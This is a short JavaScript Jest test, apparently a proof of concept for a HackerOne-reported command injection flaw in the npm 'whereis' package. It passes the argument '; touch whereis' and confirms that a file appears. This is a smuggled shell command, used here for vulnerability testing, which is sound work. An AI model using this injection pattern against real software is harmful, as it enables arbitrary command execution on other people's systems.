//https://hackerone.com/reports/319476
test("Command Injection in whereis", (done) => {
  expect.assertions(2);
  const whereis = require("whereis");
  const fs = require("fs");
  const path = "./whereis";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let filename = "; touch whereis";
  whereis(filename, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
